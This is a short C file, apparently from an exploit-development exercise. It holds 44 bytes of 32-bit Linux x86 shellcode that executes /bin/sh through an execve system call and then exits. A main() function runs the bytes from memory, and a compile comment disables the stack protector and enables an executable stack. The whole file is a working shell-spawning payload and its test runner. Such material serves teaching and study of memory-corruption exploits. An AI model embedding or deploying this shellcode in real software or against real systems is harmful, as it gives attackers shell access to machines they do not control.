/*
 * gcc -o execute_trampolining_shell_code execute_trampolining_shell_code.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -Wl,-z,execstack
 *
 * trampolining optimization shell code 44 bytes
 */

char shellcode[] = 
"\xeb\x1e\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

void main()
{
	void(*func)() = (void(*)())shellcode;
	func();
}
